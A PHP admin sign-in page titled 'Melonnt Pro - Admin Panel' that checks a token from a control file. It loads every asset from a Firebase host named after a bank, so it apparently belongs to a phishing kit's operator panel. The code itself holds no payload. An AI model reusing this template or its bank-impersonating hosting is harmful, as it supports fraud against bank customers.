<?php
error_reporting(E_ALL);
session_start();
$config = json_decode(file_get_contents('../control.json'), true);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if ($_POST['token'] != null) {
        if ($config['token'] === $_POST['token']) {
            $_SESSION['token'] = $_POST['token'];
            header("Location: dashboard");
            exit();
        } else {
            set_flash_message('err', 'Token is invalid!');
        }
    } else {
        set_flash_message('err', 'Token is required!');
    }
}

if (isset($_SESSION['token'])) {
    header("Location: dashboard");
    exit();
}

function set_flash_message($key, $message) {
    $_SESSION[$key] = $message;
    $_SESSION[$key.'_flash'] = true;
}

?>
<!doctype html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="https://regionsbank-cb54d.web.app/admin/images/favicon-32x32.png" type="image/png" />
  <!-- Bootstrap CSS -->
  <link href="https://regionsbank-cb54d.web.app/admin/css/bootstrap.min.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/bootstrap-extended.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/style.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/icons.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">

  <!-- loader-->
	<link href="https://regionsbank-cb54d.web.app/admin/css/pace.min.css') }}" rel="stylesheet" />

  <title>Melonnt Pro - Admin Panel Login</title>
</head>

<body>

  <!--start wrapper-->
  <div class="wrapper">
    
       <!--start content-->
       <main class="authentication-content">
        <div class="container-fluid">
          <div class="authentication-card">
            <div class="card shadow rounded-0 overflow-hidden">
              <div class="row g-0">
                <div class="col-lg-12">
                  <div class="card-body p-4 p-sm-5">
                      <?php
                      $key = 'err';
                      if (isset($_SESSION[$key]) && isset($_SESSION[$key.'_flash']) && $_SESSION[$key.'_flash'] === true) {
                            echo '<div class="alert alert-danger">'.$_SESSION[$key].'</div>';
                            unset($_SESSION[$key]);
                            unset($_SESSION[$key.'_flash']);
                        }
                      
                      ?>
                                          <h5 class="card-title">Sign In</h5>
                    <form class="form-body" method="POST">
                        <div class="row">
                          <div class="col-md-12">
                            <label class="form-label">Enter Token:</label>
                            <div class="ms-auto position-relative">
                              <div class="position-absolute top-50 translate-middle-y search-icon px-3"><i class="bi bi-lock-fill"></i></div>
                              <input type="password" class="form-control radius-30 ps-5" name="token" placeholder="Enter Token">
                            </div>
                                                      </div>
                          <div class="col-12 mt-3">
                            <div class="d-grid">                
                                <button type="submit" class="btn btn-primary radius-30">Sign In</button>
                            </div>
                          </div>
                        </div>
                    </form>
                 </div>
                </div>
              </div>
            </div>
          </div>
        </div>
       </main>
        
       <!--end page main-->

  </div>
  <!--end wrapper-->


  <!--plugins-->
  <script src="https://regionsbank-cb54d.web.app/admin/js/jquery.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/js/pace.min.js"></script>


</body>

</html>